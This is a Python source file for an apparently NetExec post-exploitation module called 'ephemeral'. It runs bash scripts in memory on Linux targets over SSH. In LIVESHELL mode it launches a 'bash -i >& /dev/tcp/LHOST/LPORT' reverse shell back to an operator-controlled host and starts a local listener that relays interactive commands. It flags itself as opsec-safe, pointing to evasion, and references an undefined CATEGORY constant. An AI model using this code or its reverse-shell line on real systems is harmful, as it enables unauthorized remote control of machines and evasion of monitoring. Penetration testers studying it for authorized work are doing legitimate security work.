# ~/.nxc/modules/ephemeral.py
import threading
import time
import os
import socket
import uuid

class NXCModule:
    name = "ephemeral"
    description = "Run bash scripts entirely in memory on a Linux target, optionally spawn ephemeral live shell"
    supported_protocols = ["ssh"]
    opsec_safe = True
    multiple_hosts = False
    category = CATEGORY.ENUMERATION

    def __init__(self):
        self.conn = None
        self.transport = None
        self.script_path = None
        self.raw_command = None
        self.thread = None
        self.liveshell = False
        self.lhost = None
        self.lport = None
        self.timeout = 60
        self.killfile = None

    def options(self, context, module_options):
        self.script_path = module_options.get("SCRIPT")
        self.raw_command = module_options.get("COMMAND")
        self.liveshell = module_options.get("LIVESHELL", False)
        self.lhost = module_options.get("LHOST")
        self.lport = int(module_options.get("LPORT", 0)) if module_options.get("LPORT") else None
        self.timeout = int(module_options.get("TIMEOUT", 60))
        self.killfile = module_options.get("KILLFILE", f"/tmp/kill_{uuid.uuid4().hex}") if self.liveshell else None

        context.log.display(f"[ephemeral] LIVESHELL={self.liveshell}, TIMEOUT={self.timeout}, LHOST={self.lhost}, LPORT={self.lport}")

    def on_login(self, context, connection):
        if not hasattr(connection, "conn") or connection.conn is None:
            context.log.error("[ephemeral] SSH client not found on connection.")
            return

        self.conn = connection.conn
        self.transport = self.conn.get_transport()
        if self.transport is None or not self.transport.is_active():
            context.log.error("[ephemeral] SSH transport not active.")
            return

        context.log.display("[ephemeral] SSH login succeeded!")

        # Determine command to run
        if self.liveshell:
            if not self.lhost or not self.lport:
                context.log.error("[ephemeral] LIVESHELL requires LHOST and LPORT")
                return

            context.log.display(f"[ephemeral] Spawning live shell listener on {self.lhost}:{self.lport} ...")
            listener_thread = threading.Thread(target=self._start_listener, args=(context,), daemon=True)
            listener_thread.start()

            script_content = f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
        elif self.script_path:
            if not os.path.isfile(self.script_path):
                context.log.error(f"[ephemeral] Script file not found: {self.script_path}")
                return
            with open(self.script_path) as f:
                script_content = f.read()
        elif self.raw_command:
            script_content = self.raw_command
        elif getattr(connection.args, "execute", None):
            script_content = connection.args.execute
        else:
            context.log.error("[ephemeral] No commands to execute.")
            return

        # Run command in a separate thread
        self.thread = threading.Thread(target=self._run_command, args=(context, script_content), daemon=True)
        self.thread.start()

        # Wait until execution completes
        while self.thread.is_alive():
            time.sleep(0.1)

    def _run_command(self, context, script_content):
        try:
            chan = self.transport.open_session()
            chan.exec_command("stdbuf -oL -eL bash -s")
            chan.sendall(script_content.encode() + b"\n")
            chan.shutdown_write()

            # Stream stdout/stderr live
            while not chan.exit_status_ready():
                if chan.recv_ready():
                    out = chan.recv(4096)
                    if out:
                        context.log.display(out.decode(errors="ignore").rstrip())
                if chan.recv_stderr_ready():
                    err = chan.recv_stderr(4096)
                    if err:
                        context.log.display(f"[ERR] {err.decode(errors='ignore').rstrip()}")
                time.sleep(0.01)

            # Drain remaining output
            while chan.recv_ready():
                out = chan.recv(4096)
                if out:
                    context.log.display(out.decode(errors="ignore").rstrip())
            while chan.recv_stderr_ready():
                err = chan.recv_stderr(4096)
                if err:
                    context.log.display(f"[ERR] {err.decode(errors='ignore').rstrip()}")

            exit_code = chan.recv_exit_status()
            context.log.display(f"[ephemeral] Finished with exit code: {exit_code}")
            chan.close()
            self.conn.close()
            context.log.display("[ephemeral] SSH connection closed.")

        except Exception as e:
            context.log.error(f"[ephemeral] Execution error: {e}")
            if self.conn:
                self.conn.close()
                context.log.display("[ephemeral] SSH connection closed due to error.")

    def _start_listener(self, context):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.bind((self.lhost, self.lport))
            sock.listen(1)
            context.log.display(f"[ephemeral] Listening for incoming live shell on {self.lhost}:{self.lport} ...")
            sock.settimeout(self.timeout)
            conn, addr = sock.accept()
            context.log.display(f"[ephemeral] Connection from {addr} established!")

            # Optional killfile support
            killfile_active = self.killfile is not None

            while True:
                cmd = input("$ ")
                if not cmd:
                    continue
                conn.sendall(cmd.encode() + b"\n")
                data = conn.recv(4096)
                if not data:
                    break
                context.log.display(data.decode(errors="ignore").rstrip())

                if killfile_active:
                    try:
                        with open(self.killfile) as kf:
                            context.log.display(f"[ephemeral] Killfile {self.killfile} detected, terminating shell.")
                            break
                    except FileNotFoundError:
                        pass

            conn.close()
            sock.close()
            context.log.display("[ephemeral] Live shell session closed.")

        except socket.timeout:
            context.log.display(f"[ephemeral] Live shell listener timed out after {self.timeout} seconds.")
        except Exception as e:
            context.log.error(f"[ephemeral] Listener error: {e}")
